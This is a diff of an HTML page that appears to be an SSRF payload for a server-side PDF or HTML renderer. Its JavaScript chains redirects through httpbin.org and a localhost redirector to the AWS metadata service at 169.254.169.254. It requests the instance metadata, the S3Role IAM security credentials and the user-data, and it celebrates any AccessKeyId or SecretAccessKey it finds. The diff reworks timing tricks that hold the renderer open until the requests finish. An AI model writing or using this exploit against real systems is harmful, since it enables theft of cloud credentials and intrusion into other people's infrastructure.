@@ -1,250 +1,255 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading AWS Metadata...</title>
+    <title>AWS Metadata Loader</title>
     <style>
-        /* Force visual loading state */
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
+        body { 
+            font-family: Arial, sans-serif; 
+            margin: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            background: white;
             padding: 20px;
-            background: #f0f0f0;
-        }
-        
-        .loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #ffffff;
-            z-index: 9999;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
-        
-        .spinner {
-            border: 8px solid #f3f3f3;
-            border-top: 8px solid #3498db;
-            border-radius: 50%;
-            width: 60px;
-            height: 60px;
-            animation: spin 2s linear infinite;
-            margin-bottom: 20px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .progress-bar {
-            width: 300px;
-            height: 20px;
-            background: #f0f0f0;
             border-radius: 10px;
-            overflow: hidden;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .result-section {
+            border: 3px solid #333;
             margin: 20px 0;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: #3498db;
-            width: 0%;
-            animation: progress 25s linear forwards;
-        }
-        
-        @keyframes progress {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
-        
-        .main-content {
-            display: none;
-        }
-        
-        .result-box {
-            border: 3px solid #000;
-            margin: 15px 0;
             padding: 20px;
-            background: #fff;
-            min-height: 150px;
+            background: #ffffff;
+            min-height: 200px;
         }
-        
-        .credentials-found {
+        .aws-credentials {
             background: #ff4444 !important;
             color: white;
             border: 5px solid #cc0000 !important;
             font-size: 18px;
             font-weight: bold;
             text-align: center;
-            padding: 30px;
         }
-        
-        .success {
+        .success-response {
             background: #44ff44 !important;
-            border-color: #00cc00 !important;
+            border-color: #00aa00 !important;
+        }
+        .loading-text {
+            color: #666;
+            font-style: italic;
+        }
+        pre {
+            background: #f9f9f9;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            font-size: 12px;
+            max-height: 400px;
+            overflow-y: auto;
         }
     </style>
 </head>
 <body>
-    <!-- Loading screen that forces delay -->
-    <div class="loading-screen" id="loadingScreen">
-        <div class="spinner"></div>
-        <h2>🔄 Loading AWS Metadata Services...</h2>
-        <div class="progress-bar">
-            <div class="progress-fill"></div>
+    <div class="container">
+        <h1>🎯 AWS Metadata Extraction via SSRF</h1>
+        <p><strong>Status:</strong> <span id="global-status">Initializing metadata extraction...</span></p>
+        <p><strong>Progress:</strong> <span id="progress">0/4 tests completed</span></p>
+        
+        <div class="result-section" id="section1">
+            <h2>🔍 Test 1: AWS Metadata Service v1.0 Root</h2>
+            <p class="loading-text" id="status1">⏳ Preparing request...</p>
+            <div id="content1">Waiting for execution...</div>
         </div>
-        <p id="loadingStatus">Initializing connection...</p>
-        <p><strong>PDF Generation: Please wait 30 seconds for complete data loading</strong></p>
+        
+        <div class="result-section" id="section2">
+            <h2>🔑 Test 2: IAM S3Role Credentials (v1.0)</h2>
+            <p class="loading-text" id="status2">⏳ Preparing request...</p>
+            <div id="content2">Waiting for execution...</div>
+        </div>
+        
+        <div class="result-section" id="section3">
+            <h2>📄 Test 3: AWS User Data</h2>
+            <p class="loading-text" id="status3">⏳ Preparing request...</p>
+            <div id="content3">Waiting for execution...</div>
+        </div>
+        
+        <div class="result-section" id="section4">
+            <h2>🕰️ Test 4: Legacy API (2007-01-19)</h2>
+            <p class="loading-text" id="status4">⏳ Preparing request...</p>
+            <div id="content4">Waiting for execution...</div>
+        </div>
+        
+        <div class="result-section" id="summary-section">
+            <h2>📊 EXECUTION SUMMARY</h2>
+            <div id="summary">Tests will begin shortly...</div>
+        </div>
     </div>
     
-    <!-- Main content (hidden initially) -->
-    <div class="main-content" id="mainContent">
-        <h1>🎯 AWS Metadata Extraction Results</h1>
-        
-        <div class="result-box" id="result1">
-            <h2>📋 Test 1: AWS Metadata v1.0 Root Directory</h2>
-            <div id="result1-content">Loading...</div>
-        </div>
-        
-        <div class="result-box" id="result2">
-            <h2>🔑 Test 2: S3Role IAM Credentials</h2>
-            <div id="result2-content">Loading...</div>
-        </div>
-        
-        <div class="result-box" id="result3">
-            <h2>📄 Test 3: AWS User Data</h2>
-            <div id="result3-content">Loading...</div>
-        </div>
-        
-        <div class="result-box" id="result4">
-            <h2>🕰️ Test 4: Legacy API (2007-01-19)</h2>
-            <div id="result4-content">Loading...</div>
-        </div>
-        
-        <div class="result-box" id="summary">
-            <h2>📊 FINAL SUMMARY</h2>
-            <div id="summary-content">Tests in progress...</div>
-        </div>
-    </div>
+    <!-- Force loading delay with external resource -->
+    <iframe src="data:text/html;charset=utf-8,<html><body><script>setTimeout(function(){parent.startTests();}, 8000);</script><h3>Loading external resources...</h3></body></html>" 
+            width="1" height="1" style="visibility:hidden;"></iframe>
     
     <script>
-        var testResults = [];
-        var loadingMessages = [
-            "Initializing connection...",
-            "Establishing SSRF chain...", 
-            "Connecting to httpbin.org...",
-            "Redirecting to internal redirector...",
-            "Accessing AWS metadata service...",
-            "Attempting credential extraction...",
-            "Processing responses...",
-            "Finalizing results..."
-        ];
+        var testsCompleted = 0;
+        var totalTests = 4;
+        var allResults = [];
+        var testStarted = false;
         
-        var currentMessage = 0;
-        
-        // Update loading messages
-        function updateLoadingStatus() {
-            if(currentMessage < loadingMessages.length) {
-                document.getElementById('loadingStatus').textContent = loadingMessages[currentMessage];
-                currentMessage++;
-                setTimeout(updateLoadingStatus, 3000);
+        // Fallback to start tests if iframe doesn't work
+        setTimeout(function() {
+            if (!testStarted) {
+                startTests();
             }
-        }
-        
-        // Start loading messages
-        updateLoadingStatus();
-        
-        // Execute requests during loading period
-        setTimeout(function() {
-            makeRequest('http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/', 'result1');
-        }, 5000);
-        
-        setTimeout(function() {
-            makeRequest('http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role', 'result2');
         }, 10000);
         
-        setTimeout(function() {
-            makeRequest('http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data', 'result3');
-        }, 15000);
+        function startTests() {
+            if (testStarted) return;
+            testStarted = true;
+            
+            document.getElementById('global-status').textContent = 'Executing AWS metadata requests...';
+            
+            // Test 1: AWS Metadata v1.0 root
+            setTimeout(function() {
+                executeTest(
+                    'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
+                    1,
+                    'AWS Metadata v1.0 Root Directory'
+                );
+            }, 2000);
+            
+            // Test 2: S3Role credentials
+            setTimeout(function() {
+                executeTest(
+                    'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
+                    2,
+                    'S3Role IAM Credentials'
+                );
+            }, 6000);
+            
+            // Test 3: User data
+            setTimeout(function() {
+                executeTest(
+                    'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data',
+                    3,
+                    'AWS User Data'
+                );
+            }, 10000);
+            
+            // Test 4: Legacy API
+            setTimeout(function() {
+                executeTest(
+                    'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/S3Role',
+                    4,
+                    'Legacy API S3Role'
+                );
+            }, 14000);
+            
+            // Generate final summary
+            setTimeout(function() {
+                generateFinalSummary();
+            }, 20000);
+        }
         
-        setTimeout(function() {
-            makeRequest('http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/S3Role', 'result4');
-        }, 20000);
-        
-        function makeRequest(url, resultId) {
+        function executeTest(url, testNumber, testName) {
+            document.getElementById('status' + testNumber).innerHTML = '🔄 Executing request...';
+            
             try {
                 var xhr = new XMLHttpRequest();
                 xhr.open('GET', url, false);
                 xhr.send();
                 
-                var result = xhr.responseText;
-                var content = "<strong>URL:</strong> " + url + "<br><br>";
-                content += "<strong>Response (" + result.length + " bytes):</strong><br>";
-                content += "<pre style='white-space:pre-wrap;word-wrap:break-word;background:#f9f9f9;padding:15px;border:1px solid #ccc;'>" + result + "</pre>";
+                var response = xhr.responseText;
+                var result = {
+                    testNumber: testNumber,
+                    testName: testName,
+                    url: url,
+                    response: response,
+                    hasCredentials: response.includes('AccessKeyId') || response.includes('SecretAccessKey'),
+                    success: response.length > 10
+                };
                 
-                document.getElementById(resultId + '-content').innerHTML = content;
+                allResults.push(result);
+                testsCompleted++;
                 
-                // Check for AWS credentials
-                if(result.includes('AccessKeyId') || result.includes('SecretAccessKey')) {
-                    document.getElementById(resultId).className += ' credentials-found';
-                    document.getElementById(resultId + '-content').innerHTML = 
-                        "🚨🚨🚨 AWS CREDENTIALS DETECTED! 🚨🚨🚨<br><br>" + content;
-                } else if(result.length > 50) {
-                    document.getElementById(resultId).className += ' success';
+                // Update UI
+                var statusEl = document.getElementById('status' + testNumber);
+                var contentEl = document.getElementById('content' + testNumber);
+                var sectionEl = document.getElementById('section' + testNumber);
+                
+                if (result.hasCredentials) {
+                    statusEl.innerHTML = '🎉🎉🎉 AWS CREDENTIALS DETECTED! 🎉🎉🎉';
+                    sectionEl.className += ' aws-credentials';
+                } else if (result.success) {
+                    statusEl.innerHTML = '✅ Request successful (' + response.length + ' bytes)';
+                    sectionEl.className += ' success-response';
+                } else {
+                    statusEl.innerHTML = '❌ No significant response';
                 }
                 
-                testResults.push({
-                    test: resultId,
+                contentEl.innerHTML = 
+                    '<strong>URL:</strong> ' + url + '<br><br>' +
+                    '<strong>Response Length:</strong> ' + response.length + ' bytes<br><br>' +
+                    '<strong>Content:</strong><br>' +
+                    '<pre>' + response + '</pre>';
+                
+                document.getElementById('progress').textContent = testsCompleted + '/' + totalTests + ' tests completed';
+                
+            } catch (e) {
+                allResults.push({
+                    testNumber: testNumber,
+                    testName: testName,
                     url: url,
-                    response: result,
-                    hasCredentials: result.includes('AccessKeyId')
+                    response: 'ERROR: ' + e.message,
+                    hasCredentials: false,
+                    success: false
                 });
                 
-            } catch(e) {
-                document.getElementById(resultId + '-content').innerHTML = 
-                    "<strong>ERROR:</strong> " + e.message + "<br><br><strong>URL:</strong> " + url;
-                
-                testResults.push({
-                    test: resultId,
-                    url: url,
-                    response: "ERROR: " + e.message,
-                    hasCredentials: false
-                });
+                document.getElementById('status' + testNumber).innerHTML = '❌ Error: ' + e.message;
+                document.getElementById('content' + testNumber).innerHTML = 'Request failed: ' + e.message;
+                testsCompleted++;
+                document.getElementById('progress').textContent = testsCompleted + '/' + totalTests + ' tests completed';
             }
         }
         
-        // Hide loading screen and show results after 25 seconds
-        setTimeout(function() {
-            document.getElementById('loadingScreen').style.display = 'none';
-            document.getElementById('mainContent').style.display = 'block';
+        function generateFinalSummary() {
+            document.getElementById('global-status').textContent = 'All tests completed';
             
-            // Generate summary
-            var summary = "<h3>🎯 Execution Complete</h3>";
-            summary += "<p><strong>Tests completed:</strong> " + testResults.length + "</p>";
+            var credentialTests = allResults.filter(r => r.hasCredentials);
+            var successfulTests = allResults.filter(r => r.success);
             
-            var credentialsFound = testResults.filter(r => r.hasCredentials);
-            if(credentialsFound.length > 0) {
-                summary += "<div style='background:#ff0000;color:white;padding:20px;margin:15px 0;border:3px solid #000;text-align:center;font-size:16px;'>";
-                summary += "🎉🎉🎉 AWS CREDENTIALS FOUND IN " + credentialsFound.length + " TEST(S)! 🎉🎉🎉";
-                summary += "</div>";
-            } else {
-                summary += "<p>❌ No AWS credentials detected in responses</p>";
+            var summary = '<h3>🎯 Final Results</h3>';
+            summary += '<p><strong>Total Tests:</strong> ' + allResults.length + '</p>';
+            summary += '<p><strong>Successful Responses:</strong> ' + successfulTests.length + '</p>';
+            summary += '<p><strong>Credential Detections:</strong> ' + credentialTests.length + '</p>';
+            
+            if (credentialTests.length > 0) {
+                summary += '<div style="background:#ff0000;color:white;padding:25px;margin:20px 0;border:5px solid #000;text-align:center;font-size:20px;">';
+                summary += '🚨🚨🚨 AWS CREDENTIALS FOUND! 🚨🚨🚨<br>';
+                summary += 'Check Test(s): ' + credentialTests.map(t => t.testNumber).join(', ');
+                summary += '</div>';
             }
             
-            summary += "<h4>📋 Response Summary:</h4>";
-            testResults.forEach(function(result, index) {
-                summary += "<p><strong>Test " + (index + 1) + ":</strong> " + result.response.length + " bytes";
-                if(result.hasCredentials) summary += " ✅ CREDENTIALS!";
-                summary += "</p>";
+            summary += '<h4>📋 Test Details:</h4>';
+            allResults.forEach(function(result) {
+                summary += '<p><strong>Test ' + result.testNumber + ' (' + result.testName + '):</strong> ';
+                if (result.hasCredentials) {
+                    summary += '🎉 CREDENTIALS FOUND!';
+                } else if (result.success) {
+                    summary += '✅ ' + result.response.length + ' bytes received';
+                } else {
+                    summary += '❌ Failed or empty';
+                }
+                summary += '</p>';
             });
             
-            document.getElementById('summary-content').innerHTML = summary;
-            
-        }, 25000);
+            document.getElementById('summary').innerHTML = summary;
+        }
+        
+        // Initial status
+        document.getElementById('global-status').textContent = 'Waiting for resource loading...';
     </script>
 </body>
 </html>
